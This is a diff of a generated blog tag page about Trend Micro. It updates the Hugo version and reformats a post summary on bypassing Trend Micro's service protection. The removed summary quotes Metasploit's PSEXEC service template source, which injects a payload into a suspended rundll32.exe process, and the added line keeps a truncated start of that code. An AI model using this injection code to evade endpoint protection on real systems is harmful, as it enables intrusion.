@@ -14,7 +14,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.16" />
+<meta name="generator" content="Hugo 0.17" />
 
   <meta property="og:title" content="Trendmicro" />
 <meta property="og:description" content="" />
@@ -145,7 +145,12 @@
       				
             </p>
             <article class="post-summary">
-            	@jabjorkhaug posed the following question on Twitter today: I figured I could solve this and it would be an interesting challenge. Here is what it gets detected as: The service binary that is used as part of PSEXEC is located here: MSF Directory/data/templates/src/pe/exe/service/service.c The important part to look at starts at line 57: #define WIN32_LEAN_AND_MEAN #include &lt;windows.h&gt; #define PAYLOAD_SIZE 8192 char cServiceName[32] = &quot;SERVICENAME&quot;; char bPayload[PAYLOAD_SIZE] = &quot;PAYLOAD:&quot;; SERVICE_STATUS ss; SERVICE_STATUS_HANDLE hStatus = NULL; /* * */ BOOL ServiceHandler( DWORD dwControl ) { if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN ) { ss.dwWin32ExitCode = 0; ss.dwCurrentState = SERVICE_STOPPED; } return SetServiceStatus( hStatus, &amp;ss ); } /* * */ VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors ) { CONTEXT Context; STARTUPINFO si; PROCESS_INFORMATION pi; LPVOID lpPayload = NULL; ZeroMemory( &amp;ss, sizeof(SERVICE_STATUS) ); ZeroMemory( &amp;si, sizeof(STARTUPINFO) ); ZeroMemory( &amp;pi, sizeof(PROCESS_INFORMATION) ); si.cb = sizeof(STARTUPINFO); ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS; ss.dwCurrentState = SERVICE_START_PENDING; ss.dwControlsAccepted = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN; hStatus = RegisterServiceCtrlHandler( (LPCSTR)&amp;cServiceName, (LPHANDLER_FUNCTION)ServiceHandler ); if ( hStatus ) { ss.dwCurrentState = SERVICE_RUNNING; SetServiceStatus( hStatus, &amp;ss ); if( CreateProcess( NULL, &quot;rundll32.exe&quot;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi ) ) { Context.ContextFlags = CONTEXT_FULL; GetThreadContext( pi.hThread, &amp;Context ); lpPayload = VirtualAllocEx( pi.hProcess, NULL, PAYLOAD_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE ); if( lpPayload ) { WriteProcessMemory( pi.hProcess, lpPayload, &amp;bPayload, PAYLOAD_SIZE, NULL ); #ifdef _WIN64 Context.Rip = (DWORD64)lpPayload; #else Context.Eip = (DWORD)lpPayload; #endif SetThreadContext( pi.hThread, &amp;Context ); } ResumeThread( pi.hThread ); CloseHandle( pi.hThread ); CloseHandle( pi.hProcess ); } ServiceHandler( SERVICE_CONTROL_STOP ); ExitProcess( 0 ); } } /* * */ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow ) { SERVICE_TABLE_ENTRY st[] = { { (LPSTR)&amp;cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&amp;ServiceMain }, { NULL, NULL } }; return StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY *)&amp;st ); } It&rsquo;s injecting our payload into the service binary and tossing our payload into &ldquo;rundll32.exe&rdquo; at run time on the victim (side note: you can change which bin it goes into ;).
+            	@jabjorkhaug posed the following question on Twitter today:
+I figured I could solve this and it would be an interesting challenge. Here is what it gets detected as:
+The service binary that is used as part of PSEXEC is located here:
+MSF Directory/data/templates/src/pe/exe/service/service.c
+The important part to look at starts at line 57:
+#define WIN32_LEAN_AND_MEAN #include &lt;windows.h&gt; #define PAYLOAD_SIZE	8192 char cServiceName[32] = &quot;SERVICENAME&quot;; char bPayload[PAYLOAD_SIZE] = &quot;PAYLOAD:&quot;; SERVICE_STATUS ss; SERVICE_STATUS_HANDLE hStatus = NULL; /* * */ BOOL ServiceHandler( DWORD dwControl ) { if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN ) { ss.
             </article>
 			<div class="read-more-link">
 				<a href="/post/2012/2012-07-05-bypassing-trend-micros-service-protection/"><span class="read-more-slashes">//</span>Read More...</a>
